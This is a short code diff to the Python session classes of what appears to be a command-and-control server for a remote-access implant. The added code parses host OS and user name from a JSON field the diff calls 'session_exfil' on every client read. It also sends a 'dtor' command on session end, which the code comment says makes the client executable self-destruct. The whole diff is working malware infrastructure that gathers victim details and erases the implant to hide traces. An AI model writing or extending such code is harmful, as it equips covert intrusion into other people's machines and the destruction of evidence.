@@ -20,6 +20,12 @@ class SessionData:
         self.session_os = session_os
     def SetSessionName(self, session_name):
         self.session_name = session_name
+    def SetSessionDetails(self, session_exfil):
+        try:
+            self.session_os = json.loads(session_exfil)['os']
+            self.session_name = json.loads(session_exfil)['user']
+        except:
+            return None
 
     def GetConnection(self):
         return self.connection
@@ -37,7 +43,10 @@ class Session:
         self.session_data.GetConnection().settimeout(5)
         try:
             self.session_data.GetConnection().sendall(b'\n')
+
             output = self.session_data.GetConnection().recv(4096).decode()
+            self.GetSessionData().SetSessionDetails(output)
+            
             self.session_data.GetConnection().settimeout(None)
             return output
         except socket.timeout:
@@ -78,6 +87,9 @@ class Session:
             print(f"Error: {e}")
 
     def EndSession(self):
+        # make potential client executable self-destruct
+        if self.GetSessionData().GetSessionName() != "":
+            self.connection.send(b"dtor")
         self.connection.close()
 
     def Active(self):
